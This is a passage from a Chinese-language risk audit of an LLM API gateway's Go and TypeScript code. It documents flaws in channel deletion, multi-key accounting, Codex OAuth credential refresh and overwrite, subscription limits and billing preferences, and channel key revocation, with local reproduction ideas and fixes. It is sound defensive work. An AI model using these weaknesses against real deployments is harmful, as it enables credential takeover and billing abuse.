  - `model/channel.go:41-42`：渠道累计成本 `UsedQuota` 和上游余额 `Balance` 只保存在 `channels` 当前行
  - `controller/channel.go:687-700` 与 `model/channel.go:595-603`：单渠道删除直接 `DB.Delete(channel)`，随后删除 abilities，没有保留渠道快照或墓碑记录
  - `controller/channel.go:833-849` 与 `model/channel.go:455-474`：批量删除在事务里删除 `channels` 和 `abilities`，同样没有归档 `used_quota/balance/name/tag/type`
  - `controller/channel.go:703-715` 与 `model/channel.go:870-877`：删除所有禁用渠道直接按状态删除 `channels` 行；自动禁用渠道往往正是需要保留事故上下文的对象
  - `model/log.go:48-49` 与 `model/log.go:422-456`：日志表持久字段只有 `ChannelId`，`ChannelName` 是查询时从当前渠道缓存或 DB 补齐的只读派生值；渠道删除后只能显示 `#id` 或空名称
  - `model/task.go:41-45`、`dto/task.go:32-42` 与 `relay/relay_task.go:541-558`：通用任务和任务 DTO 也只持久/返回 `channel_id`，没有渠道名称、渠道类型、tag、多 key index 或删除前成本快照
  - `web/default/src/features/channels/components/channels-columns.tsx:292-305`：渠道列表直接展示当前 `channel.used_quota`；渠道行删除后该累计值从运营界面消失
  - `web/default/src/features/usage-logs/components/columns/common-logs-columns.tsx:395-399` 与 `web/default/src/features/usage-logs/components/dialogs/details-dialog.tsx:554-558`：日志前端有名称时显示 `channel_name #id`，没有名称时退化为 `#id`
- 可能后果：一次清理禁用渠道会把已经发生的渠道成本累计、余额快照、渠道名称、类型、tag、供应商配置和自动禁用原因从主表移除；历史日志和任务仍有 `channel_id`，但无法解释“这个 id 当时是哪家供应商、哪个 tag、哪个 key 池、累计花了多少”。若上游账单在事后才出现异常扣费，运营只能从散落的日志数字 id 手工推断，且 `channels.used_quota` 已无法参与对账。结合风险 40、101、214、215，任务退款/补扣本身已经存在多套统计口径，删除渠道会进一步让“错误口径来自哪个渠道”不可追溯。
- 复现思路：本地创建一个渠道并产生一次消费或任务，使 `channels.used_quota`、`logs.channel_id`、`tasks.channel_id` 都有记录；随后禁用并调用删除禁用渠道接口，或直接删除该渠道。再查看渠道列表、日志详情和任务列表：渠道累计成本行消失，日志/任务只剩 `channel_id`，`channel_name` 无法补齐。该复现只使用本地假渠道和本地数据库，不调用真实 provider。
- 修复建议：渠道删除改为软删除或墓碑归档，至少保存 `channel_id/name/type/tag/group/models/base_url_hash/used_quota/balance/status/status_reason/deleted_at/deleted_by`；日志和任务写入时同步保存不可变的 `channel_name_snapshot/channel_type/channel_tag/channel_multi_key_index` 等审计字段。批量清理禁用渠道应默认归档而不是硬删除，并在 UI 上提示会影响历史对账。渠道成本统计应有按日志/账本重建能力，`channels.used_quota` 只作为当前渠道缓存字段。
- 优先级：P1
- 当前状态：已确认渠道删除为硬删除，历史日志和任务没有渠道名称/类型快照；尚未补充迁移或归档表。

### 风险 217：多 key 渠道只按易漂移的索引记录少量上下文，任务/MJ 和统计无法稳定追踪单 key 成本与异常

- 标题：普通同步请求的管理员日志上下文会记录 `multi_key_index`，但渠道累计成本仍只按 `channel_id` 聚合；通用任务、MJ 固定价日志和任务退款/补扣日志没有稳定 key 维度；多 key 删除还会重排索引，导致历史 `multi_key_index` 不能长期对应同一个上游 key
- 影响范围：多 key 渠道成本核算、单 key 限流/封禁复盘、自动禁用原因、通用视频/图片任务、MJ 派生动作、上游账单按 key 对账、渠道利润分析、异常 key 下线后的历史追溯
- 触发条件：一个渠道配置多个上游 key；不同 key 在上游侧有独立额度、价格、封禁、余额或账单；请求经过轮询/随机 key；后续某个 key 被自动禁用、手工删除、删除自动禁用 key，或运营需要按上游 key 查历史消耗
- 涉及文件/函数：
  - `model/channel.go:199-285`：`GetNextEnabledKey` 返回 `key` 和当前数组索引 `selectedIdx`，没有稳定 key id、key 指纹或账务维度
  - `middleware/distributor.go:421-436`：普通 relay 选中多 key 时只把 `ContextKeyChannelIsMultiKey=true` 和 `ContextKeyChannelMultiKeyIndex=index` 放入上下文
  - `service/log_info_generate.go:274-287` 与 `controller/relay.go:386-392`：同步请求消费日志和错误日志可在 `other.admin_info` 中记录 `multi_key_index`，但这是管理员可见调试信息，不是结构化成本字段
  - `model/channel.go:855-867`：`UpdateChannelUsedQuota` 只按 `channel_id` 增加 `channels.used_quota`，没有 key 级 used quota
  - `service/task_billing.go:17-65`：通用任务提交消费日志手工构造 `other`，只写 `is_task/request_path/model_price/group_ratio` 等信息，没有写 `admin_info.is_multi_key` 或 `multi_key_index`
  - `model/log.go:333-374` 与 `service/task_billing.go:152-245`：任务失败退款、差额退款和差额补扣日志只接收 `ChannelId`，没有 key index、key 指纹或原始 key 快照
  - `service/log_info_generate.go:471-481` 与 `relay/mjproxy_handler.go:236-248`：MJ 固定价日志使用 `GenerateMjOtherInfo`，该函数也不写多 key 上下文
  - `relay/relay_task.go:83-104`：任务派生动作锁回原任务渠道时调用 `GetNextEnabledKey()`，但丢弃返回的 key index，也没有重设 `ContextKeyChannelIsMultiKey/ContextKeyChannelMultiKeyIndex`；后续日志和错误归因可能沿用初始路由的 key 上下文
  - `types/channel_error.go:3-20` 与 `model/channel.go:641-690`：自动禁用单 key 依赖 `UsingKey` 字符串匹配当前 key 列表；错误对象没有稳定 key id 或当时的 key index
  - `controller/channel.go:1560-1632` 与 `controller/channel.go:1648-1702`：删除单个 key 或删除自动禁用 key 时会重建 key 列表，并把剩余 key 的状态和原因重新索引；历史日志里的 `multi_key_index` 不再稳定指向同一个 key
  - `model/log.go:76-83`：普通用户日志会删除 `admin_info` 是正向隐私保护，但也说明 key 级上下文不是面向账单解释的正式字段
- 可能后果：某个上游 key 被限流、封禁、余额异常或成本飙升时，运营只能看到整个渠道的 `used_quota`，无法从渠道统计区分是哪一个 key 消耗了成本。普通同步日志中即使有 `multi_key_index`，删除或清理 key 后 index 会漂移，历史“index=2”可能对应不到原 key；任务和 MJ 成本更严重，消费、退款和补扣日志本身就没有 key 维度。若任务派生动作实际锁回原渠道并轮到另一个 key，日志/自动禁用仍可能沿用初始上下文，导致故障 key、成本 key 和记录 key 三者不一致。多 key 渠道被当作一个成本池后，单 key 滥用、被盗、供应商差异定价或局部封禁都会被平均化，延迟运营发现。
- 复现思路：本地创建一个三 key 渠道并开启多 key 轮询，分别发起普通同步请求、通用任务和 MJ 固定价请求；检查普通同步消费日志 `other.admin_info.multi_key_index` 是否存在，而任务/MJ 日志是否缺少该字段。随后删除第 0 个 key 或删除自动禁用 key，再查看历史日志中的 `multi_key_index=1/2` 是否已经无法按当前 key 列表解释。再构造任务派生动作让初始路由命中渠道 A、原任务属于多 key 渠道 B，确认 `relay/relay_task.go` 重选 B 的 key 时没有更新 multi-key context。该复现只使用本地假上游或 mock，不对真实 provider 做高频调用。
- 修复建议：为多 key 引入稳定 `key_id` 或不可逆 `key_fingerprint`，选择 key、禁用 key、删除 key 和账务日志都使用该稳定维度，而不是数组下标。`logs.other` 可继续隐藏真实 key，但应保存管理员可见的 `channel_key_id/key_fingerprint/key_index_at_time`；`channels.used_quota` 之外增加 key 级 usage ledger 或 `channel_key_usage` 聚合。通用任务、MJ、任务退款/补扣、错误日志和自动禁用事件都应写入同一套 key 元数据。删除 key 应保留墓碑记录和历史状态，不应让剩余 key 重新占用旧 index 作为唯一解释维度。任务锁回原渠道时必须同步更新 `ContextKeyChannelIsMultiKey`、`ContextKeyChannelMultiKeyIndex` 和 `RelayInfo.ChannelMultiKeyIndex`。
- 优先级：P1
- 当前状态：已确认普通同步日志只记录易漂移 index，任务/MJ 和任务账单日志缺少 key 维度，删除 key 会重排索引；尚未补充 key 级账本或稳定 key id。

### 风险 218：Codex usage 自动刷新忽略凭证写回失败，且刷新写回缺少 CAS，可能留下过期 key 或覆盖人工改动

- 标题：Codex usage 查询遇到 401/403 会用 refresh token 换新 token 并继续用新 access token 查询 usage，但写回 `channels.key` 的 DB 错误被忽略；手动刷新、自动刷新和 usage 刷新都按 `id` 直接覆盖整段 key JSON，没有用旧 key/version 做条件更新
- 影响范围：Codex 渠道 OAuth 凭证、`channels.key`、Codex usage 查询、后台手动刷新、后台自动刷新任务、代理缓存/渠道缓存、Codex relay 请求成功率、凭证过期后的运营判断
- 触发条件：Codex 渠道 access token 过期；管理员打开 usage 或手动刷新；后台自动刷新任务运行；数据库写入失败、主从/缓存短暂异常，或管理员在刷新 HTTP 请求进行期间编辑渠道 key/切换账号/修正 refresh token
- 涉及文件/函数：
  - `controller/codex_usage.go:71-78`：usage 查询先用当前 access token 调用 `FetchCodexWhamUsage`；当上游返回 401/403 且存在 refresh token 时进入刷新分支
  - `controller/codex_usage.go:82-96`：刷新成功后更新 `oauthKey.AccessToken/RefreshToken/LastRefresh/Expired`，但 `model.DB.Model(...).Update("key", ...)` 的错误被 `_ = ...` 忽略；随后仍会 `InitChannelCache`、`ResetProxyClientCache`
  - `controller/codex_usage.go:99-105`：即使写回失败，当前请求仍用内存里的新 `oauthKey.AccessToken` 再查一次 usage，并可能向后台返回 success
  - `service/codex_credential_refresh.go:42-103`：手动/自动刷新路径会读取渠道、刷新 token、整段 marshal 后按 `Where("id = ?", ch.Id).Update("key", ...)` 覆盖，没有 `WHERE key = oldKey`、版本号、更新时间条件或冲突检测
  - `service/codex_credential_refresh_task.go:54-133`：自动刷新任务批量扫描 enabled/auto-disabled Codex 渠道，跳过多 key，逐个调用 `RefreshCodexChannelCredential`；失败只写 warn，成功后统一刷新缓存
  - `controller/codex_usage.go:39-44` 与 `service/codex_credential_refresh_task.go:95-106`：usage 查询和自动刷新都不支持多 key Codex 渠道，key 池场景无法自动维护每个 OAuth JSON
  - `service/codex_oauth.go:87-135`：refresh token 调用会返回新的 access/refresh token；如果上游 refresh token 是轮换式，旧 refresh token 失效后，本地写回失败会让数据库继续保存不可再刷新的旧 token
  - `relay/channel/codex/adaptor.go:153-176`：真实 Codex relay 请求只从当前 `info.ApiKey` JSON 解析 access token 和 account id；不会在请求链路里自动刷新过期 token
- 可能后果：管理员查看 usage 时看到刷新后的 usage 成功返回，误以为渠道凭证已经修复；但如果 DB 写回失败，数据库和缓存仍可能保留旧 access/refresh token，下一次真实 Codex 请求继续 401/403，甚至因为 refresh token 已被上游轮换而无法再次刷新。另一个场景是管理员在刷新请求进行期间手动替换渠道 key 或切换账号，刷新返回后按 id 覆盖整段 `channels.key`，可能把人工修复的新凭证覆盖回旧账号的新 token。由于 usage 刷新分支没有记录可见审计和写回失败告警，运营会看到“usage 查询刚成功，但渠道请求仍失败”的矛盾状态，排查成本高。
- 复现思路：本地用 mock Codex OAuth token endpoint 和 usage endpoint：第一次 usage 返回 401，refresh 返回新 access/refresh，第二次 usage 返回 200；让 DB `Update("key")` 返回错误或临时断开写库，观察 `/api/channel/:id/codex/usage` 是否仍可能返回成功但 `channels.key` 未更新。并发场景可在 refresh HTTP 阻塞期间手动更新同一渠道 key，放行 refresh 后检查是否被旧流程覆盖。不要对真实 OpenAI/Codex OAuth 凭证做破坏性测试。
- 修复建议：把 Codex token refresh 写回改成带版本/CAS 的事务：读取时保存 `old_key_hash` 或 `updated_at`，写入时 `WHERE id=? AND key=?`，RowsAffected 为 0 时返回冲突并重新读取最新凭证。usage 自动刷新必须检查 DB 写回错误，失败时不要静默返回“凭证已刷新”的成功语义；至少在响应里标记 `credential_persisted=false` 并写入 Root 可见审计/告警。refresh token 轮换场景应优先保证持久化成功后再刷新缓存；失败时不要清缓存。真实 relay 请求可考虑在安全限流下复用统一刷新状态机，而不是让 usage 查询成为隐式修复入口。多 key Codex 应要么禁用 OAuth 自动维护入口并给出明确 UI 提示，要么实现逐 key 稳定 key id 的刷新。
- 优先级：P1
- 当前状态：已确认 usage 刷新忽略 DB 写回错误，手动/自动/usage 刷新写回均缺少 CAS；尚未补充回归测试。

### 风险 224：订阅限购只在下单和完成阶段检查已生效订阅，未对 pending 支付做占位，可能出现已付款但套餐发放失败

- 标题：套餐 `max_purchase_per_user`/周期限购不计入 pending 订阅订单；用户可创建多笔待支付订单，后续回调在完成阶段被限购拦截后留下 paid/no-entitlement
- 影响范围：Stripe/Creem/Epay/Waffo Pancake 订阅购买、订阅 pending 订单、购买次数限制、周期限购、用户套餐权益、支付回调重试、客服对账和退款处理
- 触发条件：套餐配置了 `MaxPurchasePerUser` 或 `PeriodPurchaseLimit`；用户在第一笔订阅支付完成前创建多笔同套餐 pending 订单并完成多笔真实支付；或者同一用户在周期边界附近创建多笔 pending 后集中支付。第一笔完成后生成 `user_subscriptions`，后续已付款订单进入 `CompleteSubscriptionOrder` 时重新执行购买限制检查并返回错误。
- 涉及文件/函数：
  - `controller/subscription_payment_guard.go:12-18`：下单前只调用 `CheckSubscriptionPayEligibilityTx(nil, userId, plan)`，没有在同一事务中创建限购占位或锁定用户/套餐。
  - `controller/subscription_payment_stripe.go:67-90`、`controller/subscription_payment_epay.go:53-88`、`controller/subscription_payment_creem.go:73-90`、`controller/subscription_payment_waffo_pancake.go:66-83`：各 provider 都是在资格检查后创建独立 pending `SubscriptionOrder`，pending 订单不会被限购计数。
  - `model/subscription.go:444-479`：`CheckSubscriptionPurchaseLimitTx` 只统计 `user_subscriptions`，不统计 `subscription_orders` 的 pending/paid-in-progress 状态。
  - `model/subscription.go:547-559`：`CreateUserSubscriptionFromPlanTx` 在发放权益前再次检查购买限制；超限会直接返回错误。
  - `model/subscription.go:625-650`：`CompleteSubscriptionOrder` 的事务中，限购错误会导致订阅创建、topup 镜像和订单 success 全部回滚，订单仍停留在 pending。
  - `controller/topup_stripe.go:273-278`：Stripe 订阅完成失败只记录错误并返回，外层 webhook 仍可能响应 200；后续需要人工排查 pending 订单和 Stripe 付款。
  - `controller/subscription_payment_epay.go:152-160`、`controller/topup_creem.go:303-312`、`controller/topup_waffo_pancake.go:501-506`：Epay/Creem/Pancake 完成失败分别返回 fail/500/retry，但本地没有 `paid_but_blocked`、`needs_refund` 或限购失败状态。
- 可能后果：用户已经在支付平台完成第二笔或第 N 笔订阅付款，但本地订单因为限购检查失败无法标记 success，也不会发放套餐、升级用户组或写入订阅 topup 镜像。支付平台可能继续重试 webhook，数据库里只看到长期 pending 订阅订单；客服需要人工判断是重复购买、限购拦截还是回调故障。若人工为了处理争议强行绑定套餐，又可能绕过限购；若直接退款，系统也没有结构化状态记录“已付款但因限购拒绝发放”，后续审计困难。
- 复现思路：本地创建一个 `MaxPurchasePerUser=1` 或周期限购为 1 的套餐；同一用户在没有 active 订阅时连续调用两个订阅下单接口创建两条 pending 订单；依次模拟成功回调调用 `CompleteSubscriptionOrder`。第一笔会生成 active 订阅，第二笔会因 `已达到该套餐购买上限` 回滚，`subscription_orders.status` 仍为 pending，支付侧已成功的事实只能存在于 webhook 日志/第三方后台。
- 修复建议：订阅下单应引入明确的 purchase reservation 状态机。创建支付会话前在事务中按 `user_id + plan_id` 建立 pending 占位并计入限购，带过期时间和 provider checkout id；完成时只消费自己的 reservation，不再因其他已完成订单把已付款订单回滚成 pending。也可以把 `subscription_orders` 的 pending/processing 纳入限购计数，并在支付过期/失败/退款时释放占位。完成阶段若发现限购冲突，应把订单转为 `paid_blocked/needs_refund`，保存 provider proof，禁止静默留在 pending，并在后台暴露退款/作废流程。
- 优先级：P1
- 当前状态：已确认订阅限购没有 pending 占位；完成阶段限购失败会回滚并保留 pending 订单，尚未修复。

### 风险 226：订阅套餐没有消费前模型/任务/source policy，免费或赠送的无限额度套餐可按用户通用权限消耗高价能力

- 标题：`SubscriptionPlan` 只定义价格、时长、额度和升级分组；订阅预扣按用户 active 套餐余额选择，不按套餐来源、模型、任务类型、渠道或分组做消费前限制
- 影响范围：订阅套餐、管理员赠送套餐、订阅兑换码、无限额度套餐、任务类模型、用户组升级、token 模型限制、渠道成本和活动/试用成本控制
- 触发条件：运营创建 `total_amount=0` 的无限额度套餐，或通过兑换码/管理员绑定发放套餐；用户自身或 token 仍有某个高价模型、图片/视频任务模型或高倍率分组的通用访问权限；用户计费偏好为订阅优先或订阅专用；随后发起正式 API 或任务类请求。
- 涉及文件/函数：
  - `model/subscription.go:145-188`：`SubscriptionPlan` 字段只有标题、价格、支付产品 ID、购买限制、`UpgradeGroup`、`TotalAmount`、`QuotaResetPeriod` 等，没有 allowed models、allowed groups、allowed channels、allowed endpoints、task policy 或 source policy。
  - `model/subscription.go:241-255`：`UserSubscription.Source` 只记录 `order/admin/redemption`，没有绑定消费策略。
  - `model/subscription.go:1073-1175`：`PreConsumeUserSubscription` 虽接收 `modelName`，但实际只查询用户 active 订阅并按 `end_time asc, id asc` 选择余额足够的套餐；`quotaType` 和 `modelName` 没有用于策略判断。
  - `service/billing_session.go:379-398`：订阅资金源构造时只传入 `requestId/userId/modelName/amount`；没有携带 endpoint、task action、channel、token model limits 或 source policy。
  - `controller/relay.go:153-165`：普通 relay 先按当前模型计算价格，再调用 `PreConsumeBilling`；进入订阅扣费后没有额外的套餐级模型白名单检查。
  - `relay/relay_task.go:179-210`：任务类 relay 按任务模型和参数估算 quota 后直接 `ForcePreConsume` 调用统一订阅预扣，任务类型/动作没有订阅级 allow/deny 判断。
  - `web/default/src/features/subscriptions/types.ts:25-50` 与 `web/default/src/features/subscriptions/lib/plan-form.ts:29-52`：前端套餐类型和表单也只暴露价格、额度、购买限制、升级组和支付产品 ID，说明后台目前没有可配置的套餐消费范围。
- 可能后果：活动兑换码、客服补偿或管理员赠送的“免费试用”套餐，如果被配置成无限额度或较大额度，会和真实付费套餐一样消耗所有用户可访问的高价能力；尤其是视频/图片/按次任务模型，单次成本高且失败/重算复杂，赠送来源的成本会迅速放大。`UpgradeGroup` 还可能把用户提升到更高价或更大渠道池分组，而订阅本身没有“只允许低成本模型/禁止任务类/禁止指定渠道”的边界。该问题不等同于 token 模型限制失效：token/user/group 的通用权限仍可能生效，但运营无法对不同 source 的套餐单独设置更窄的消费范围。
- 复现思路：本地创建一个 `total_amount=0` 的订阅套餐，通过管理员绑定或订阅兑换码发给用户；保证用户 token 允许某个高价模型或任务模型；设置 `billing_preference=subscription_first` 或 `subscription_only` 后调用该模型。观察 `PreConsumeUserSubscription` 不会因为 `source=admin/redemption`、模型高价、任务类型或渠道分组拒绝，只要用户有 active 订阅就会预扣/消耗订阅额度。
- 修复建议：为订阅计划增加消费策略快照，例如 `allowed_models/denied_models`、`allowed_groups`、`allowed_endpoint_types`、`allow_tasks`、`max_per_request_quota`、`max_daily_cost`、`source_policy`；`PreConsumeUserSubscription` 在持锁选择套餐前按当前模型、endpoint、task action、token/user group 和 source 做 eligibility 过滤。兑换码和管理员赠送应能覆盖或收窄原计划策略，并把策略快照写入 `UserSubscription`，避免后续套餐编辑漂移。无限额度套餐应默认要求显式高危确认，并提供禁止任务类和只允许低成本模型的默认模板。
- 优先级：P1
- 当前状态：已确认订阅计划和预扣链路没有套餐级消费 policy；尚未修复。

### 风险 238：Codex OAuth 直接保存接口可在 AdminAuth 下覆盖生产渠道 key，缺少 step-up、审计和冲突检测

- 标题：`POST /api/channel/:id/codex/oauth/complete` 在完成 OAuth code exchange 后直接 `Update("key", encoded)` 覆盖现有 Codex 渠道 key；该入口只继承渠道组 `AdminAuth`，没有 Root、安全验证、操作原因、审计日志或 `WHERE old_key` 冲突保护
- 影响范围：Codex 渠道 OAuth access/refresh token、生产路由凭证、渠道缓存、代理缓存、供应商账号归属、上游 usage/成本归属、渠道复制/编辑后的凭证一致性、运营事故追责
- 触发条件：普通 Admin 账号被盗或误操作；内部脚本调用带 channel id 的 Codex OAuth 完成接口；多个管理员同时维护同一 Codex 渠道；管理员在 OAuth 流程中授权了错误的 OpenAI/Codex 账号；刷新任务或人工编辑与 OAuth 完成并发发生。
- 涉及文件/函数：
  - `router/api-router.go:233-262`：渠道路由整体使用 `AdminAuth`；Codex OAuth start/complete、refresh、usage 都挂在该组下，未额外叠加 `RootAuth`、`CriticalRateLimit`、`SecureVerificationRequired` 或 `DisableCache`。
  - `controller/codex_oauth.go:66-72` 与 `controller/codex_oauth.go:117-123`：带 channel id 的 start/complete 入口存在，后端可直接针对已有渠道执行 OAuth。
  - `controller/codex_oauth.go:75-90` 与 `controller/codex_oauth.go:148-164`：只校验目标渠道存在且类型为 Codex，并读取该渠道 proxy；没有校验操作者是否具备 Root/密钥轮换权限，也没有要求原因。
  - `controller/codex_oauth.go:166-176`：OAuth state 和 verifier 来自当前 dashboard session，这是防 CSRF/错绑的正向证据，但它不等同于高危密钥轮换 step-up。
  - `controller/codex_oauth.go:181-204`：用授权 code 换取 access/refresh token，并把 account_id、email、过期时间等组合成 Codex key JSON。
  - `controller/codex_oauth.go:215-221`：`channelID > 0` 时直接按 `id` 更新 `channels.key`，随后刷新渠道缓存和代理缓存；没有 CAS、版本号或旧 key hash 条件。
  - `controller/codex_oauth.go:222-231`：直接保存成功响应只返回 account/email/过期时间，没有记录 `RecordLog` 或结构化管理员审计。
  - `controller/codex_oauth.go:236-245` 与 `web/default/src/features/channels/components/dialogs/codex-oauth-dialog.tsx:111-122`：不带 channel id 的入口会把完整 JSON 凭证返回前端，再填入 key 输入框；这是当前 default 前端使用路径，后续仍通过普通保存渠道落库。
  - `controller/channel.go:516-543` 与风险 218：手动 refresh 也在 AdminAuth 下更新同一 key 字段，且缺少 CAS；OAuth 直接保存会与 refresh/usage 自动刷新形成并发覆盖窗口。
- 可能后果：普通 Admin 不需要 Root 二次确认就能把某个生产 Codex 渠道的凭证切到另一个 OpenAI/Codex 账号，真实用户流量和上游成本会立刻切换到新账号；如果授权了错误账号或低额度账号，渠道可能快速 401/403、限流或成本归属错误。并发场景下，管理员 A 手工修复 key、管理员 B 完成旧 OAuth 流程、自动刷新任务同时写回，都可能按最后写入者覆盖 `channels.key`；由于没有 `old_key_hash`、操作者、原因和审计日志，事后很难判断是谁把凭证换掉、换到哪个账号、是否覆盖了刚轮换的新 refresh token。这个入口还绕过了“查看完整渠道 key 需要 Root + 安全验证”的保护语义：虽然它不是读取旧 key，但它能直接替换生产密钥资产，影响面不低于查看 key。
- 复现思路：本地 mock Codex OAuth token endpoint 或在测试环境用假 token 结果，先创建 Codex 渠道并保存 key A；发起 `/:id/codex/oauth/start`，再用同一 session 调 `/:id/codex/oauth/complete` 返回 key B，确认只用 AdminAuth 即可覆盖 `channels.key` 并刷新缓存。并发验证可在 code exchange 阻塞期间手工更新 key C，放行后观察 key B 是否覆盖 C。不要用真实 OpenAI/Codex 账号做破坏性轮换测试。
- 修复建议：把 Codex OAuth 直接保存和 refresh 统一纳入“渠道凭证轮换”控制面：要求 Root 或独立 `channel:key:rotate` 权限、`SecureVerificationRequired`、`CriticalRateLimit`、操作原因和二次确认；禁止系统 access token 调用。写入时使用 CAS 条件，例如 `WHERE id=? AND key_hash=?` 或渠道版本号，冲突时要求重新读取并确认。成功/失败都记录结构化审计：admin id、channel id/name、old_key_fingerprint、new_key_fingerprint、old/new account_id/email、expires_at、source=oauth_complete/refresh、request id、IP。前端默认应使用“生成后填入表单再保存”的路径或一个显式的“轮换凭证”弹窗，不应让隐藏接口无确认地直接覆盖生产 key。
- 优先级：P1
- 当前状态：已确认带 channel id 的 OAuth complete 会在 AdminAuth 下直接覆盖渠道 key 并刷新缓存，缺少 step-up、审计和 CAS；default 前端当前未调用该直接保存 API，但接口对脚本/旧前端/直接请求可用。

### 风险 254：通用用户设置保存会重建整段 `UserSetting`，清空订阅扣费偏好、语言和侧边栏设置，可能把用户资金来源重置为默认订阅优先

- 标题：`UpdateUserSetting` 只保留通知、`AcceptUnsetRatioModel`、`RecordIpLog` 和管理员的上游模型通知字段；它没有从旧设置合并 `BillingPreference/SidebarModules/Language`。用户在设置页保存通知或日志选项后，钱包页设置的 `wallet_first/wallet_only/subscription_only` 可能被清空，后续 relay 通过 `NormalizeBillingPreference("")` 回到 `subscription_first`。
- 影响范围：用户设置 JSON、订阅/钱包扣费偏好、钱包页套餐选择器、通知设置、语言/侧边栏设置、真实 relay 资金来源、消费日志中的 `billing_preference`、客服对账。
- 触发条件：用户先在钱包页或订阅页设置 `billing_preference=wallet_first/wallet_only/subscription_only`；随后调用通用用户设置保存接口，修改通知方式、阈值、`accept_unset_model_ratio_model` 或 `record_ip_log`；该接口重建 settings 并保存；用户再发起 API 请求。
- 涉及文件/函数：
  - `dto/user_settings.go:4-18`：`UserSetting` 同时包含通知字段、`AcceptUnsetRatioModel`、`RecordIpLog`、`SidebarModules`、`BillingPreference` 和 `Language`。
  - `controller/subscription.go:72-89`：`UpdateSubscriptionPreference` 会读取当前 setting，只修改 `BillingPreference` 后保存，这是正确的合并语义。
  - `controller/user.go:664-714`：`UpdateSelf` 更新 `sidebar_modules` 或 `language` 时也会读取当前 setting 后局部修改。
  - `controller/user.go:1229-1267`：`UpdateUserSetting` 虽然读取了 `existingSettings`，但只用于保留 `UpstreamModelUpdateNotifyEnabled`；随后构造新的 `dto.UserSetting`，没有复制 `BillingPreference`、`SidebarModules`、`Language`。
  - `controller/user.go:1270-1299`：按通知类型只回填 webhook/email/Bark/Gotify 相关字段；未选中的通知字段会被清空，这是可接受的通知语义，但同一段 JSON 里的扣费偏好和 UI 偏好也一起丢失。
  - `common/str.go:120-127`：`NormalizeBillingPreference` 对空值或非法值默认返回 `subscription_first`。
  - `service/billing_session.go:347-425`：真实 relay 用 `relayInfo.UserSetting.BillingPreference` 决定先扣订阅还是先扣钱包，空值会按 `subscription_first` 处理。
  - `service/log_info_generate.go:341-342`：只有 `BillingPreference` 非空时日志才记录 `billing_preference`；字段被清空后，日志看起来像默认偏好而不是用户曾经设置过偏好。
  - `docs/newapi-ops-risk-audit.md:6939-6940`：既有前端文案风险覆盖 `subscription_only` 展示和后端语义冲突，本轮新增的是另一个设置入口会把用户主动选择的偏好清空。
  - `docs/newapi-ops-risk-audit.md:349-362` 与 `docs/newapi-ops-risk-audit.md:5428-5429`：既有风险已覆盖 `User.Update`/`User.Edit` 可能把旧用户对象写回 Redis；本轮不同点是 DB 中保存的 setting 本身已经被覆盖丢字段，不是缓存延迟。
- 可能后果：用户选择 `wallet_only` 以避免消耗订阅套餐，随后去账户设置里修改通知阈值或开启 `record_ip_log`，保存后 `BillingPreference` 被清空。下一次 API 请求会按默认 `subscription_first` 先消耗订阅，导致用户认为“明明设置了只用钱包，怎么套餐额度被扣了”。反向场景中，用户设置 `subscription_only` 以控制现金钱包不被扣，保存通知设置后变成 `subscription_first`，订阅不可用时会回退钱包，造成钱包余额被意外消费。语言和侧边栏设置也可能被清空，虽不是资产漏洞，但会掩盖根因：用户以为只是 UI 偏好丢失，实际扣费偏好也一并丢失。客服从日志中可能看不到 `billing_preference` 字段，只能反查历史设置变更，争议处理困难。
- 复现思路：本地用户先调用 `/api/subscription/preference` 设置 `billing_preference=wallet_only`，确认 `/api/subscription/self` 返回 `wallet_only`；随后调用通用用户设置接口保存通知阈值或 `accept_unset_model_ratio_model`，请求体不含 `billing_preference`；再次读取 `/api/subscription/self`，观察是否回到 `subscription_first`。再发起一个有 active subscription 且钱包也有余额的 relay 请求，检查 `BillingSource`/消费日志是否按默认偏好执行。复现只用本地用户和本地额度/套餐数据，不调用真实上游。
- 修复建议：用户设置应拆分为多个独立配置对象或 patch 语义，不能让一个入口重建整段 `UserSetting`。最小修复是在 `UpdateUserSetting` 中以 `existingSettings` 为基准，只更新该接口负责的字段，明确保留 `BillingPreference/SidebarModules/Language`；同时为所有保存入口增加回归测试：更新通知不改变扣费偏好，更新扣费偏好不改变通知、语言和侧边栏。设置保存后应记录字段级 diff 和来源入口，消费日志可记录规范化后的 `billing_preference`，避免空值默认难以追溯。
- 优先级：P1
- 当前状态：已确认通用设置保存会丢失同一 JSON 中其它入口维护的字段；尚未修复。

### 风险 263：渠道更新使用 struct `Updates`，清空 key/模型/分组/地区/运行时信息等零值字段会被跳过，旧高危配置继续生效

- 标题：`Channel.Update()` 使用 `DB.Model(channel).Updates(channel)` 保存结构体，GORM struct 更新默认跳过零值字段。`Key`、`Other`、`OtherInfo`、`Models`、`Group`、`OtherSettings` 等都是非指针 string/int 字段；管理员提交空字符串试图清空或撤销时，接口可能返回成功但 DB 保留旧值。前端响应还会把 `channel.Key=""` 后返回，进一步掩盖旧 key 实际仍在生效。
- 影响范围：渠道 key 撤销、模型列表清空、分组清空/迁移、Azure/Vertex 地区字段、渠道运行时 settings、自动禁用 `other_info.status_reason`、abilities 重建、渠道缓存、供应商凭证应急下线。
- 触发条件：管理员编辑渠道，把 key 清空以撤销凭证或准备重新授权；把模型/分组清空以临时下线能力；把 `other/settings/other_info` 清空以移除旧区域、旧运行时配置或旧禁用原因；或者脚本调用更新接口提交零值字段。请求通过后端校验并调用 `channel.Update()`。
- 涉及文件/函数：
  - `model/channel.go:23-57`：`Channel` 中 `Key/Other/OtherInfo/Models/Group/OtherSettings` 是非指针字段；`ParamOverride/HeaderOverride/Setting/Tag` 等是指针字段，零值行为不同。
  - `controller/channel.go:456-514`：`validateChannel(..., isAdd=false)` 只在 Codex key 非空时校验 JSON，普通更新不要求 `Key` 非空，也不阻止清空模型/分组等字段。
  - `controller/channel.go:863-878`：`UpdateChannel` 绑定请求并通过校验后继续保存；没有把“这是清空字段”转成 map update 或显式 Select 字段。
  - `controller/channel.go:879-895`：更新前复制原 `ChannelInfo`，说明后端会保护部分状态，但其它普通字段仍交给 struct update。
  - `model/channel.go:526-566`：`Channel.Update()` 在保存前只重算多 key size；真正落库是 `DB.Model(channel).Updates(channel)`，没有 `Select("*")`、map update 或显式字段列表。
  - `model/channel.go:570-572`：保存后重新读取 channel 并调用 `UpdateAbilities`；如果 `Models/Group` 的空值更新被跳过，abilities 会按旧模型/分组重建，运营以为已清空能力但路由仍可用。
  - `controller/channel.go:982-989`：更新成功后清缓存，但响应前直接 `channel.Key=""`；即使 DB 保留旧 key，返回体也不会暴露“清空失败”。
